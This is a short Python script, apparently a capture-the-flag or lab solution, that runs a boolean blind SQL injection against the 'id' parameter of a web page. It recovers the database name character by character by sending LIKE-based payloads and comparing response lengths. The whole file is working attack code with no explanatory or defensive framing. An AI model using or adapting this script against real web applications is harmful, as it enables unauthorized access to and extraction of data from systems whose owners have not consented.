#!/usr/bin/env python
#Author: Anakein
#Email: anakein@protonmail.ch
#Machine: ExploitKB WebApp 
#Date: 02/04/2019

try:
    from urllib.parse import urlparse
except ImportError:
    from urlparse import urlparse

import requests

characters = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
target = "http://exploitwebapp.com/artpage.php"
lenght_string = 10

lenght = 2395 #200 found chars

r = requests.get(target)
if r.status_code != requests.codes.ok:
    raise ValueError("Sorry! We cannot connect the site...")
else:
    print("Connection OK! We can go now...")

def letBlind():
    foundChars = []
    for i in range(lenght_string):
        for c in characters:
            test = ''.join(foundChars)
            blindSql = "?id=1' AND (SELECT binary database()) LIKE '"+test+"{}%'--+".format(c)
            r = requests.get(target+blindSql)
            if len(r.content) == lenght:
                foundChars.append(c) 
    print("Database: " + ''.join(foundChars))
 
#Starting
letBlind()
